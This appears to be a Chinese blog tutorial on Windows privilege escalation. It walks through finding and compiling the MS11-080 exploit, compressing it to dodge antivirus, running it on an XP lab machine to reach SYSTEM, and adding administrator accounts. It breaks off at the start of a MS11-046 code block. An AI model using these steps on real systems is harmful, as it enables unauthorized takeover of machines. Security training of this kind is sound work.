<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha256-yIDrPSXHZdOZhAqiBP7CKzIwMQmRCJ8UeB8Jo17YC4o=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.css" integrity="sha256-6cQIC71/iBIYXFK+0RHAvwmjwWzkWd+r7v/BX3/vZDc=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>

<script class="next-config" data-name="main" type="application/json">{"hostname":"z9m8r8.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="该文章暂无概述">
<meta property="og:type" content="article">
<meta property="og:title" content="渗透测试之提权：利用漏洞提权">
<meta property="og:url" content="https://z9m8r8.github.io/2022/02/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%8F%90%E6%9D%83%EF%BC%9A%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/index.html">
<meta property="og:site_name" content="Ghost&#39;s Blog">
<meta property="og:description" content="该文章暂无概述">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2022-02-15T09:26:00.000Z">
<meta property="article:modified_time" content="2023-12-23T13:42:15.743Z">
<meta property="article:author" content="Ghost">
<meta property="article:tag" content="提权">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://z9m8r8.github.io/2022/02/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%8F%90%E6%9D%83%EF%BC%9A%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://z9m8r8.github.io/2022/02/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%8F%90%E6%9D%83%EF%BC%9A%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/","path":"2022/02/15/渗透测试之提权：利用漏洞提权/","title":"渗透测试之提权：利用漏洞提权"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>渗透测试之提权：利用漏洞提权 | Ghost's Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Ghost's Blog</p>
      <i class="logo-line"></i>
    </a>
      <p class="site-subtitle" itemprop="description">人若无名，便可专心练剑！</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ms11-080%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA"><span class="nav-text">1. Ms11-080漏洞演示</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ms11-046%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA"><span class="nav-text">2. MS11-046漏洞演示</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ms14-068%E6%BC%8F%E6%B4%9E%E6%BC%94%E7%A4%BA"><span class="nav-text">3. Ms14-068漏洞演示</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#linux%E4%B8%8B%E6%8F%90%E6%9D%83cev-2012-0056-%E6%BC%94%E7%A4%BA"><span class="nav-text">4.
Linux下提权（CEV-2012-0056 演示）</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Ghost"
      src="/images/avatar.png">
  <p class="site-author-name" itemprop="name">Ghost</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">149</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">25</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">90</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/z9m8r8" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://www.cnblogs.com/z9m8r8" title="博客园 → https:&#x2F;&#x2F;www.cnblogs.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fa-solid fa-blog fa-fw"></i>博客园</a>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
  </div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://z9m8r8.github.io/2022/02/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%8F%90%E6%9D%83%EF%BC%9A%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="Ghost">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Ghost's Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="渗透测试之提权：利用漏洞提权 | Ghost's Blog">
      <meta itemprop="description" content="该文章暂无概述">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          渗透测试之提权：利用漏洞提权
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-02-15 17:26:00" itemprop="dateCreated datePublished" datetime="2022-02-15T17:26:00+08:00">2022-02-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-12-23 21:42:15" itemprop="dateModified" datetime="2023-12-23T21:42:15+08:00">2023-12-23</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Kail-Linux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">Kail Linux渗透测试</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Kail-Linux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%8F%90%E6%9D%83/" itemprop="url" rel="index"><span itemprop="name">提权</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>4.2k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>15 分钟</span>
    </span>
</div>

            <div class="post-description">该文章暂无概述</div>
        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h2 id="ms11-080漏洞演示">1. Ms11-080漏洞演示</h2>
<ul>
<li><strong>Kb2592799（补丁编号）</strong></li>
<li>https://technet.microsoft.com/library/security/ms11-080</li>
</ul>
<p><strong>Kali：searchsploit命令查找漏洞</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># searchsploit ms11-080</span></span><br><span class="line">---------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                          |  Path</span><br><span class="line">                                        | (/usr/share/exploitdb/)</span><br><span class="line">---------------------------------------- ----------------------------------------</span><br><span class="line">Microsoft Windows - <span class="string">&#x27;AfdJoinLeaf&#x27;</span> Local | exploits/windows/local/21844.rb</span><br><span class="line">Microsoft Windows XP/2003 - <span class="string">&#x27;afd.sys&#x27;</span> L | exploits/windows/local/18176.py</span><br><span class="line">---------------------------------------- ----------------------------------------</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220215120449465-1747440424.png" /></p>
<ul>
<li>通过Afd.sys文件进行提权</li>
<li>适用32位系统，XP和2003，Eng：表示适用于英文版操作系统，可能在中文上不适用</li>
<li>将18176.py拷贝到XP系统中【注：XP需安装python环境】</li>
</ul>
<p><strong>检查xp是否已安装补丁</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220215121731454-1119660422.png" /></p>
<p><strong>若目标系统没有自己需要的编译环境，可先在自己的环境中将代码编译成
exe 执行程序，再在目标上执行。</strong></p>
<p><strong>python代码编译成 exe 所需组件</strong></p>
<p><strong>• Pywin32</strong></p>
<p>• <a
target="_blank" rel="noopener" href="https://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/pywin32-219.win32-py2.7.exe/download"
class="uri">https://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/pywin32-219.win32-py2.7.exe/download</a></p>
<p><strong>python环境安装：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220215122554975-554350476.png" /></p>
<p><strong>• Pyinstaller【作用：将其他python脚本转换为exe】</strong></p>
<p>• <a target="_blank" rel="noopener" href="https://pypi.python.org/pypi/PyInstaller/2.1"
class="uri">https://pypi.python.org/pypi/PyInstaller/2.1</a></p>
<p><strong>将解压的pyinstaller放到python27中，将18176.py放到pyinstaller文件中。</strong></p>
<p><strong>通过 cmd 编译</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">C:\Python27\PyInstaller-2.1&gt;<span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 0CCA-0323</span><br><span class="line"></span><br><span class="line"> Directory of C:\Python27\PyInstaller-2.1</span><br><span class="line"></span><br><span class="line">02/15/2022  12:39 PM    &lt;DIR&gt;          .</span><br><span class="line">02/15/2022  12:39 PM    &lt;DIR&gt;          ..</span><br><span class="line">02/15/2022  12:01 PM            12,215 18176.py</span><br><span class="line">02/15/2022  12:27 PM    &lt;DIR&gt;          bootloader</span><br><span class="line">02/15/2022  12:26 PM    &lt;DIR&gt;          doc</span><br><span class="line">02/15/2022  12:26 PM    &lt;DIR&gt;          old</span><br><span class="line">09/18/2013  08:14 PM             3,429 PKG-INFO</span><br><span class="line">02/15/2022  12:30 PM    &lt;DIR&gt;          PyInstaller</span><br><span class="line">01/31/2013  11:20 AM             3,444 pyinstaller-gui.py</span><br><span class="line">03/20/2013  10:22 PM               555 pyinstaller.py</span><br><span class="line">09/15/2013  10:27 PM             6,544 setup.py</span><br><span class="line">02/15/2022  12:27 PM    &lt;DIR&gt;          tests</span><br><span class="line">02/15/2022  12:27 PM    &lt;DIR&gt;          utils</span><br><span class="line">               5 File(s)         26,187 bytes</span><br><span class="line">               8 Dir(s)  38,400,126,976 bytes free</span><br><span class="line"></span><br><span class="line">C:\Python27\PyInstaller-2.1&gt;..\python.exe pyinstaller.py --onefile 18176.py</span><br><span class="line">437 INFO: wrote C:\Python27\PyInstaller-2.1\18176\18176.spec</span><br><span class="line">484 INFO: Testing <span class="keyword">for</span> ability to <span class="built_in">set</span> icons, version resources...</span><br><span class="line">547 INFO: ... resource update available</span><br><span class="line">…………………………</span><br><span class="line">13969 INFO: Appending archive to EXE C:\Python27\PyInstaller-2.1\18176\dist\18176.exe</span><br></pre></td></tr></table></figure>
<p><strong>目标机（XPsp3）测试，为防止在上传到其他系统时，被杀毒软件拦截，可先进行压缩。由于普通用户无法在C盘写入，可新建个临时文件temp，然后解压到temp。</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220215130247735-1096774761.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220215130336400-384876061.png" /></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">**C:\Documents and Settings\a\Desktop\ 18176&gt;<span class="built_in">whoami</span></span><br><span class="line">DH-CA8822AB9589\a</span><br><span class="line"></span><br><span class="line">C:\Documents and Settings\a\Desktop\18176&gt;net user a**</span><br><span class="line">User name                    a</span><br><span class="line">Full Name</span><br><span class="line">Comment</span><br><span class="line">User<span class="string">&#x27;s comment</span></span><br><span class="line"><span class="string">Country code                 000 (System Default)</span></span><br><span class="line"><span class="string">Account active               Yes</span></span><br><span class="line"><span class="string">Account expires              Never</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Password last set            2/14/2022 10:20 PM</span></span><br><span class="line"><span class="string">Password expires             3/29/2022 9:07 PM</span></span><br><span class="line"><span class="string">Password changeable          2/14/2022 10:20 PM</span></span><br><span class="line"><span class="string">Password required            Yes</span></span><br><span class="line"><span class="string">User may change password     Yes</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Workstations allowed         All</span></span><br><span class="line"><span class="string">Logon script</span></span><br><span class="line"><span class="string">User profile</span></span><br><span class="line"><span class="string">Home directory</span></span><br><span class="line"><span class="string">Last logon                   2/15/2022 12:55 PM</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Logon hours allowed          All</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Local Group Memberships      Users</span></span><br><span class="line"><span class="string">Global Group memberships     *None</span></span><br><span class="line"><span class="string">The command completed successfully.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">**C:\Documents and Settings\a\Desktop\18176 &gt;net localgroup Administrators a /add</span></span><br><span class="line"><span class="string">System error 5 has occurred.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Access is denied.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">C:\Documents and Settings\a\Desktop\18176&gt;18176.exe -O XP**</span></span><br><span class="line"><span class="string">[&gt;] MS11-080 Privilege Escalation Exploit</span></span><br><span class="line"><span class="string">[&gt;] Matteo Memelli - ryujin@offsec.com</span></span><br><span class="line"><span class="string">[&gt;] Release Date 28/11/2011</span></span><br><span class="line"><span class="string">[+] Retrieving Kernel info...</span></span><br><span class="line"><span class="string">[+] Kernel version: ntkrnlpa.exe</span></span><br><span class="line"><span class="string">[+] Kernel base address: 0x804d7000L</span></span><br><span class="line"><span class="string">[+] HalDispatchTable address: 0x80545838L</span></span><br><span class="line"><span class="string">[+] Retrieving hal.dll info...</span></span><br><span class="line"><span class="string">[+] hal.dll base address: 0x806d0000L</span></span><br><span class="line"><span class="string">[+] HaliQuerySystemInformation address: 0x806e6bbaL</span></span><br><span class="line"><span class="string">[+] HalpSetSystemInformation address: 0x806e9436L</span></span><br><span class="line"><span class="string">[*] Triggering AFDJoinLeaf pointer overwrite...</span></span><br><span class="line"><span class="string">[*] Spawning a SYSTEM shell...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">**C:\WINDOWS\system32&gt; whoamiNT AUTHORITY\SYSTEM**</span></span><br><span class="line"><span class="string">**C:\WINDOWS\system32&gt; net localgroup Administrators a /add</span></span><br><span class="line"><span class="string">The command completed successfully.**</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">C:\WINDOWS\system32&gt;net user a</span></span><br><span class="line"><span class="string">User name                    a</span></span><br><span class="line"><span class="string">Full Name</span></span><br><span class="line"><span class="string">Comment</span></span><br><span class="line"><span class="string">User&#x27;</span>s comment</span><br><span class="line">Country code                 000 (System Default)</span><br><span class="line">Account active               Yes</span><br><span class="line">Account expires              Never</span><br><span class="line"></span><br><span class="line">Password last <span class="built_in">set</span>            2/14/2022 10:20 PM</span><br><span class="line">Password expires             3/29/2022 9:07 PM</span><br><span class="line">Password changeable          2/14/2022 10:20 PM</span><br><span class="line">Password required            Yes</span><br><span class="line">User may change password     Yes</span><br><span class="line"></span><br><span class="line">Workstations allowed         All</span><br><span class="line">Logon script</span><br><span class="line">User profile</span><br><span class="line">Home directory</span><br><span class="line">Last logon                   2/15/2022 12:55 PM</span><br><span class="line"></span><br><span class="line">Logon hours allowed          All</span><br><span class="line"></span><br><span class="line">**Local Group Memberships*Administrators       *Users**</span><br><span class="line">Global Group memberships     *None</span><br><span class="line">The <span class="built_in">command</span> completed successfully.</span><br></pre></td></tr></table></figure>
<p><strong>提权成功后，可创建属于自己的管理员账号，或者提升自己为管理员权限，如：net
user b b /add，net localgroup Administrators a /add</strong></p>
<h2 id="ms11-046漏洞演示">2. MS11-046漏洞演示</h2>
<ul>
<li><strong>kb2503665</strong></li>
<li>https://docs.microsoft.com/en-us/security-updates/securitybulletins/2011/ms11-046</li>
</ul>
<p>可造成DoS，蓝屏等，利用代码可在kali下找到（或<a
target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/40564"
class="uri">https://www.exploit-db.com/exploits/40564</a>下载即可）。</p>
<p><strong>渗透代码（c）：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span 